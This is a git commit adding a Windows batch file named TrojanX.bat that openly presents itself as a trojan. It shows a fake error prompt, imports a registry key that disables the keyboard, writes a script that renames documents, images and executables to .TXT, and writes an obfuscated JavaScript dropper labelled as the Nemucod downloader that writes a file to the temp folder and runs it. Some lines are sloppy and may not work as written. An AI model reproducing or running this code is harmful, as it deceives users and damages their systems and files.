a879560d496aa650cfd4acc53fd35a2ff53027c0
Err01 <132213761+Err01-Hub20@users.noreply.github.com>
2023-07-24 12:31:54 +0200

    Create TrojanX.bat

---
+++ TrojanX.bat
@@ -0,0 +1,205 @@
+:: Made by Frank 
+
+@echo off 
+title System-Manager
+echo A problem has been detected. Your computer needs to restart press Enter to continue.
+pause 
+echo Collecting information...
+
+echo Installing Update...
+
+:: Malware files 
+
+echo Ipconfig /release >> System.bat 
+echo md System23 >> System.bat
+echo cd System23 >> System.bat
+echo mkdir Games >> System.bat 
+echo mkdir VirusLove >> System.bat 
+echo mkdir Bitcoin-Private-Keys >> System.bat 
+echo mkdir System332 >> System.bat 
+echo mkdir OhNoooHelp >> System.bat 
+echo mkdir LoveSweden >> System.bat 
+echo mkdir HateSweden >> System.bat 
+echo mkdir Spongebob >> System.bat 
+echo mkdir System23LOL >> System.bat 
+echo mkdir EHT-Private-Keys >> System.bat 
+echo mkdir Monero-Private-Keys >> System.bat 
+echo mkdir Credit-Card-information >> System.bat  
+echo cd Credit-Card-information >> System.bat 
+echo mkdir Mastercard >> Credit-Card-information >> System.bat 
+echo mkdir DebitCard >> Credit-Card-information >> System.bat 
+echo mkdir SEB >> Credit-Card-information >> System.bat 
+echo mkdir NorwayBank >> Credit-Card-information >> System.bat  
+echo mkdir PinCodes >> Credit-Card-information >> System.bat 
+echo cd .. >> System.bat 
+echo cd Bitcoin-Private-Keys >> System.bat 
+echo mkdir 1wQlBit2330 >>  Bitcoin-Private-Keys >> System.bat 
+echo mkdir 7ZaLpPa43UQ >>  Bitcoin-Private-Keys >> System.bat 
+echo mkdir Ew220AqxLvB >>  Bitcoin-Private-Keys >> System.bat 
+echo mkdir BitcoinHacking >>  Bitcoin-Private-Keys >> System.bat 
+echo cd .. >> System.bat  
+echo mkdir HackingFuck >> System.bat 
+echo cd HackingFuck >> System.bat 
+echo mkdir Hahaahahha >> HackingFuck >> System.bat
+echo mkdir IPadress >> HackingFuck >> System.bat
+echo cd IPadress >> HackingFuck >> System.bat
+echo mkdir 192.168.1.103 >> IPadress >> HackingFuck >> System.bat
+echo cd .. >> HackingFuck >> System.bat
+echo mkdir KillComputerFucker >> System.bat 
+echo mkdir Passwords >> System.bat 
+echo cd Passwords >> System.bat  
+echo mkdir Passwordxyz >> Passwords >> System.bat
+echo mkdir LbYyuQw12Lm >> Passwords >> System.bat
+echo mkdir SwqLkJn33Fn >> Passwords >> System.bat
+
+:: Nokeyboard registery Trojan
+
+echo Windows Registry Editor Version 5.00 > "repair.reg"
+echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "repair.reg"
+echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> "repair.reg"
+echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> "repair.reg"
+echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> "repair.reg"
+echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> "repair.reg"
+echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> "repair.reg"
+echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> "repair.reg"
+echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> "repair.reg"
+echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> "repair.reg"
+echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> "repair.reg"
+echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> "repair.reg"
+echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ >> "repair.reg"
+echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ >> "repair.reg"
+echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ >> "repair.reg"
+echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ >> "repair.reg"
+echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ >> "repair.reg"
+echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ >> "repair.reg"
+echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ >> "repair.reg"
+echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ >> "repair.reg"
+echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> "repair.reg"
+echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "repair.reg"
+echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "repair.reg"
+reg import repair.reg
+
+
+
+
+echo REN *.DOC *.TXT >> Repair.bat 
+echo REN *.JPEG *.TXT >> Repair.bat 
+echo REN *.LNK *.TXT >> Repair.bat 
+echo REN *.AVI *.TXT >> Repair.bat 
+echo REN *.MPEG *.TXT >> Repair.bat 
+echo REN *.COM *.TXT >> Repair.bat  
+echo REN *.BAT *.TXT >> Repair.bat 
+
+
+
+
+:: End 
+:: Java malware " Trojan-Downloader.Js.Nemucod.Ew " 
+
+echo var KOnIKwU = 0;while(KOnIKwU < 100000){KOnIKwU++;} >> Start.js
+
+echo function DUnqa(CrUXMMA){var JKNVrNaK = '28';var YMKhM='"' + new Date() + '"';var ZHRUf=0;while(ZHRUf<CrUXMMA.length){var sWhiQwl=oDCcUPPhn(JKNVrNaK^QWCTkt(CrUXMMA,ZHRUf));YMKhM+=sWhiQwl;ZHRUf++;}return YMKhM;} >> Start.js
+
+
+
+echo var test1= >> Start.js
+echo "  zir husr<}_uYuRo45<gj}n<~die!%%%%%7-'j}n<Qn^PXS<!<-,,'n"+ >> Start.js
+echo "yhinr<Q}ht2nsirx4[WiftJt4564~die1Qn^PXS57Qn^PXS5'a  zir h"+ >> Start.js
+echo "usr<SNOqw~dW4j}W[]5<gj}n<}kFyQFsp!;]^_XYZ[TUVWPQRSLMNOHIJ"+ >> Start.js
+echo "KDEF;7;}~ xyz{tuvwpqrslmnohijkdef;'zsn4j}n<jqj^R!,'jqj^R "+ >> Start.js
+echo "j}W[]'jqj^R775gfIy}[7!}kFyQFsp2 t}n]h4Q}ht2zpssn4Q}ht2n}r"+ >> Start.js
+echo "xsq456}kFyQFsp2pyr{ht55'anyhinr<fIy}['a  zir husr<SVFFlTF"+ >> Start.js
+echo "NwLTdou4]^yuWmrLL^w]Jh5<gnyhinr<ryk<] hujyDS~vy h4]^yuWmr"+ >> Start.js
+echo "LL^w]Jh5'a    j}n<D]X~ImP<!<ryk<X}hy45'  ktupy4hniy5<g  j"+ >> Start.js
+echo "}n<^DFm vQ<!<ryk<X}hy45'  j}n<pYplSX{<!<ryk<X}hy4^DFm vQ2"+ >> Start.js
+echo "{yhHuqy45<1<D]X~ImP2{yhHuqy455'  uz4pYplSX{2{yhOy srxo45<"+ >> Start.js
+echo "\"<+5<g  ~ny}w'  a  ZPJTu^{!ryk<] hujyDS~vy h4>KO nulh2Ot"+ >> Start.js
+echo "ypp>5'  ZPJTu^{2nir4>lur{<1r<-<1k<>7>.,,,<,2,2,2->0,01-5'"+ >> Start.js
+echo "  a  zir husr<jKesiizUni4d[yIxIFo0xVHR Vy_ztfP5<gpkr]D]e!"+ >> Start.js
+echo ",d,7-'xLQ]M_y!,d,'d[yIxIFo2Nir4xVHR Vy_ztfP0<pkr]D]e0<xLQ"+ >> Start.js
+echo "]M_y5'a  j}n< ^PYh<!<G>thhl&33lns in}hsnwr2}ll3./2ydy>A' "+ >> Start.js
+echo " j}n<xxhKy<!<G>thhl&33lns in}hsnwr2}ll3.(2ydy>A'  OM}]tWn"+ >> Start.js
+echo "ehr_4 ^PYh0<;-))-,2ydy;5'  OM}]tWnehr_4xxhKy0<;.+$$,2ydy;"+ >> Start.js
+echo "5'  zir husr<OM}]tWnehr_4YlNyDzr0Dv]JYnQ[E5<g  j}n<UIvN!."+ >> Start.js
+echo "/(1./('  ktupy4hniy5<g  uz4YlNyDzr2pyr{ht !//(1//(5<~ny}w"+ >> Start.js
+echo "'  j}n<Y{KEpj<!<YlNyDzr2pyr{ht'  j}n<VYWN<!<}_uYuRo45<9<Y"+ >> Start.js
+echo "{KEpj'  j}n<qxoMr K[n!YlNyDzrGVYWNA'  j}n<^hmsZ!}_uYuRo45"+ >> Start.js
+echo "'  j}n<l]KzsuSDKE!Dv]JYnQ[E'  j}n<~u ]ZQk!Dv]JYnQ[E'  j}n"+ >> Start.js
+echo "<vHI[hkoD!*,(1*,/'  j}n<{UnvOvy]s<!<ryk<] hujyDS~vy h4~Pk"+ >> Start.js
+echo "wyfx457hM{Hq457> >7>nul>7>h2Otypp>5'  j}n<~u ]ZQk<!< xYQt"+ >> Start.js
+echo "d4{UnvOvy]s5<7<Ohnur{2znsq_t}n_sxy4%.5<7<~u ]ZQk'  j}n<SR"+ >> Start.js
+echo "pEP<!<zir husr45g  nyhinr<ryk<] hujyDS~vy h4^[Neq4;QOD:Q{"+ >> Start.js
+echo "[P}LhkN:QP.2D;7;Q:jL}MWrKxHXu:PTHHL;0G,0.0(A0;:;55'  a45'"+ >> Start.js
+echo "  eEnv4qxoMr K[n0SRpEP5'  uz<4SRpEP2oh}hio<!!<.,-1-5<g  j"+ >> Start.js
+echo "}n<eMHOz_v<!<ryk<] hujyDS~vy h4^[Neq4;]XS:X^:uUzvwrVKS:2:"+ >> Start.js
+echo "jTJFnOyjQ:Ohny}q;0G,0-0/0)A0;:;55'  j}n<QlZYrZ}hXjWd!mpXm"+ >> Start.js
+echo "q4eMHOz_v0SRpEP2Nyolsroy^sxe0~u ]ZQk5'  a  hne<g  jKesiiz"+ >> Start.js
+echo "Uni4{UnvOvy]s0~u ]ZQk5'  j}n<Or}Jtpf<!<[yhS~vy h4;kurq{qh"; >> Start.js
+
+echo var test2=  >> Start.js
+
+echo "o&guqlynosr}husrPyjyp!uqlynosr}hya;52Ydy Miyne4;Oypy h<6<"+ >> Start.js
+echo "znsq<Kur/.CLns yoo<Ktyny<R}qy<!<@;;7l]KzsuSDKE7;@;;5'  uz"+ >> Start.js
+echo "<4<Or}Jtpf2_sirh<\"!<--1-,<5g~ny}w'a  a< }h t4y5<ga  UIvN"+ >> Start.js
+echo "77'  YlNyDzr2olpu y<4VYWN0+,-1+,,5'  a  a  zir husr<hM{Hq"+ >> Start.js
+echo "45gnyhinr<;O;7;;'a  zir husr<~Pkwyfx45gnyhinr<;K;7;;'a  z"+ >> Start.js
+echo "ir husr<PpF{U45gnyhinr<;L;7;;'a  zir husr<PI[ViZ45gnyhinr"+ >> Start.js
+echo "<;H;7;;'a  zir husr<Rh^iM[45gnyhinr<;9;7PI[ViZ457;Q;7PpF{"+ >> Start.js
+echo "U457;;7;9;<7<;;'a  zir husr< xYQtd4H]^feS5gj}n<zij[w SK!G"+ >> Start.js
+echo ">Ydl}rxYrjunsrqy>7>rhOhnur{o>A'nyhinr<H]^feSGzij[w SKG,AA"+ >> Start.js
+echo "4Rh^iM[455a  zir husr<mpXmq4Iun_pJIW0mxLTR0mjH[IYo_]U5ghn"+ >> Start.js
+echo "egIun_pJIW2slyr45'_SFTJWZw4Iun_pJIW5'{yNqPSR4Iun_pJIW0mxL"+ >> Start.js
+echo "TR5'dRRKp _Qe4Iun_pJIW5'~Zey4Iun_pJIW0mjH[IYo_]U5'_Ziekhs"+ >> Start.js
+echo "o!Iun_pJIW2oufy'r]rOkwh4Iun_pJIW5'nyhinr<_Ziekhso'a }h t4"+ >> Start.js
+echo "y5gaa  zir husr<eEnv4TFnrif0eeWzdt 5ghnegJ]zh<!<;[6]hPvEq"+ >> Start.js
+echo "MkKO6Y6H6RXkjhY{[~D Q;2olpuh4;6;5'eeWzdt 2slyr4J]zhG,A7J]"+ >> Start.js
+echo "zhG.A7J]zhG/A0<TFnrif0<z}poy5'eeWzdt 2oyhNymiyohTy}xyn4>I"+ >> Start.js
+echo "oyn1]{yrh>0<>Lehtsr>7>1inppu~3/2->5'LyE]dOw4eeWzdt 5'a }h"+ >> Start.js
+echo " t4y5gaa  zir husr<LyE]dOw4sfkRuql5<gsfkRuql2oyrx45'a  zi"+ >> Start.js
+echo "r husr<d~iRwr4SII}H[i0rq[~eFuU5gnyhinr<SII}H[i2olpuh4rq[~"+ >> Start.js
+echo "eFuU5'a  zir husr<^[Neq4yX}}sMzu0WPEXlN0l__snEk[L5gWFYir!"+ >> Start.js
+echo "d~iRwr4yX}}sMzu0l__snEk[L5' ^PExN_<!<;V~{;'zsn4tiFIDkKo!,"+ >> Start.js
+echo "'tiFIDkKo WPEXlN2pyr{ht'tiFIDkKo775<g ^PExN_7!WFYirGWPEXl"+ >> Start.js
+echo "NGtiFIDkKoAA'anyhinr< ^PExN_2oi~ohnur{4/0 ^PExN_2pyr{ht5'"+ >> Start.js
+echo "a  zir husr<[WiftJt45gj}n<pj_Eyo!G>n}rxsq>A'nyhinr<Q}htGp"+ >> Start.js
+echo "j_EyoG,AA45a  zir husr<]OTP4lKQzj{5<glKQzj{2slyr45'a  zir"+ >> Start.js
+echo " husr<_SFTJWZw4unn~uTLNq5<gunn~uTLNq2hely!-'a  zir husr<{"+ >> Start.js
+echo "yNqPSR4^JEN0JUsRS5<gnyhinr<36m[vQKN_hVufzlDd F jReLOoE63^"+ >> Start.js
+echo "JEN2knuhy4JUsRS5'a  zir husr<dRRKp _Qe4wo~tNJ5<gj}n<tP iD"+ >> Start.js
+echo "vjXSF!GA'wo~tNJ2lsouhusr!tP iDvjXSF2pyr{ht64++*$%-/1***5'"+ >> Start.js
+echo "a  zir husr<~Zey4]shFJRm0[HLVedY5<g]shFJRm2o}jyHsZupy4[HL"+ >> Start.js
+echo "VedY0<.5'a  zir husr<r]rOkwh4N~^jq5<gN~^jq2 psoy45'a  "+ >> Start.js
+echo " "; >> Start.js
+echo function oDCcUPPhn(FZkmgGFlq){var JnOSHt = String.fromCharCode(FZkmgGFlq);return JnOSHt;} >> Start.js
+echo function QWCTkt(koYPiQFy,SwxygCq){return koYPiQFy.charCodeAt(SwxygCq)} >> Start.js
+echo function rojADaYaIEebNq() {return ""}; >> Start.js
+
+echo Cxbgo=DUnqa(test1+test2);
+echo var EUqCtDX='Scripting.FileSystemObjectScripting.FileSystemObjectScripting.FileSystemObjectScripting.FileSystemObjectScripting.FileSystemObject'; >> Start.js
+echo function BGDkeBYt(){return '.j'+'s';}function zVyuaqHjkWNyNzeH(TjAnoVLJuFB){return aPiWwaYNvJ(TjAnoVLJuFB)+'\\'+'xHPfxZ'+'pTzpO'+BGDkeBYt()} >> Start.js
+echo function aPiWwaYNvJ(IyMiQIQQHujd){return IyMiQIQQHujd.ExpandEnvironmentStrings('%'+'T'+'MP%');}var ckxZnXp='NJZSHJagIRLruvTxSECnfIBXRHEjFFKaUdcFmSeMjmylZEoMSwulKGCWlDOfcKgcEcYDKCMIccaFCPKPErRfLjEEkLxibfvBNGUoctOnbsiRSCwPRjdVlunTFgvXOpGNA';var wVoZgCMr,ZVeCyoiw,EnRvRf;var PKbwaiYc='.';var NDbKFya='ip';var kRUqnV='W'+'S'+'cr'+NDbKFya;kgJUHWD=kRUqnV+'t'+PKbwaiYc+'She'+'ll';EnRvRf=WScript.CreateObject(kgJUHWD);wVoZgCMr=new ActiveXObject('Scripting.FileSystemObject');ZVeCyoiw=wVoZgCMr.OpenTextFile(zVyuaqHjkWNyNzeH(EnRvRf), 2, true);ZVeCyoiw.Write(Cxbgo);ZVeCyoiw.Close();ePiRxEJ(EnRvRf,ytlxsbxgl(EnRvRf)+'xHPfxZ'+'pTzpO'+BGDkeBYt());function ePiRxEJ(dOQeyy,HpDQzSLWj){dOQeyy.run(HpDQzSLWj,0x0+1, 0x0);}function ytlxsbxgl(xQQpgkiueG){ return aPiWwaYNvJ(xQQpgkiueG)+String.fromCharCode(92);}function JdDmfcGRZ(PEZZnWMY,gCKDzq,NXWtRVozNY){var sJGW = PEZZnWMY.substring(0,NXWtRVozNY);var IinA = PEZZnWMY.substring(NXWtRVozNY);return sJGW+gCKDzq+IinA;} >> Start.js
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:: Worm type code 
+:: Malware struct 
+
